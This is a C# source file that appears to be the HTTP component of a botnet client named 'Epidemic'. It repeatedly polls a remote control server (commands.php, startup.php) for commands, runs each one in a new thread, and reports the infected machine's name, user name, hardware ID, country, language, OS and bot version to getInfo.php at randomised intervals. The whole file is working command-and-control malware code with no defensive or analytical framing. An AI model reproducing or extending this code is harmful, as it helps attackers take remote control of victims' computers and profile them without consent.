using System;
using System.Threading;
using System.Web;

namespace Epidemic_HTTP;

internal class HTTP
{
	private static string httpDir = null;

	public HTTP(string dir)
	{
		httpDir = dir;
	}

	public void startHttp()
	{
		if (!Config.debug)
		{
			string[] commands = GetCommands(startup: true);
			if (commands != null)
			{
				Commands @object = new Commands(commands);
				Thread thread = new Thread(@object.ProcessCommands);
				thread.Start();
			}
		}
		while (true)
		{
			if (!Config.debug)
			{
				string[] commands2 = GetCommands(startup: false);
				if (commands2 != null)
				{
					Commands object2 = new Commands(commands2);
					Thread thread2 = new Thread(object2.ProcessCommands);
					thread2.Start();
				}
			}
			Thread thread3 = new Thread(CheckIn);
			thread3.Start();
			Random random = new Random();
			int millisecondsTimeout = Config.min_http_check_time + random.Next(0, Config.min_http_check_time * 2);
			Thread.Sleep(millisecondsTimeout);
		}
	}

	private string[] GetCommands(bool startup)
	{
		if (startup)
		{
			return GetBotInfo("startup");
		}
		return GetBotInfo("commands");
	}

	private void CheckIn()
	{
		Flags flags = new Flags();
		Functions.GetWebpageContents(Config.http_dir + "getInfo.php?compname=" + HttpUtility.UrlEncode(Environment.MachineName) + "&compuser=" + HttpUtility.UrlEncode(Environment.UserName) + "&hwid=" + HttpUtility.UrlEncode(Functions.GetProcessorID()) + "&country=" + HttpUtility.UrlEncode(Functions.getCountryCode()) + "&complang=" + Functions.getComputerLanguage() + "&os=" + HttpUtility.UrlEncode(Functions.GetOperatingSystem()) + "&flags=" + HttpUtility.UrlEncode(flags.getFlags()) + "&version=" + HttpUtility.UrlEncode(Config.bot_version.ToString()));
	}

	public static string[] GetBotInfo(string info)
	{
		string text = null;
		switch (info)
		{
		case "commands":
			text = "commands.php";
			break;
		case "startup":
			text = "startup.php";
			break;
		}
		try
		{
			return Functions.GetWebpageContents(Config.http_dir + text).Split(new string[1] { "<br /><br />" }, StringSplitOptions.RemoveEmptyEntries);
		}
		catch
		{
			return null;
		}
	}
}
